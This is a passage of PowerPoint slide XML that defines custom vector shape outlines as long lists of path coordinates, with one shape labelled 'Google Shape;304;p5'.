                  <a:lnTo>
                    <a:pt x="15957" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15700" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15444" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15113" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13389" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="7153"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6126" y="10161"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6787" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="12068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="10161"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3449" y="8657"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3889" y="8950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="12288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="12288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="8950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="8657"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8291" y="14049"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8401" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="14489"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="14599"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="14489"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="14049"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8914" y="11188"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10051" y="11481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="12288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="14819"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="13682"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="13792"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="13902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="11591"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="11188"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6493" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6163" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="10674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="11261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="14709"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="15076"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="15223"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="15406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="15516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="15516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="15406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="15406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="15516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="15516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="15406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="15260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="14819"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="13682"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14416" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16140" y="11481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16507" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16581" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16471" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16287" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15994" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13683" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13389" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="2164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="2274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="1137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="1027"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="1577"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660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4" name="Google Shape;304;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6553775" y="1840025"/>
              <a:ext cx="234775" cy="276975"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="9391" h="11079" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="4916" y="441"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5026" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="441"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3375" y="6493"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3375" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="6493"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4292" y="6933"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4256" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="6933"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5209" y="4219"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5429" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="6456"/>
                  </a:lnTo>
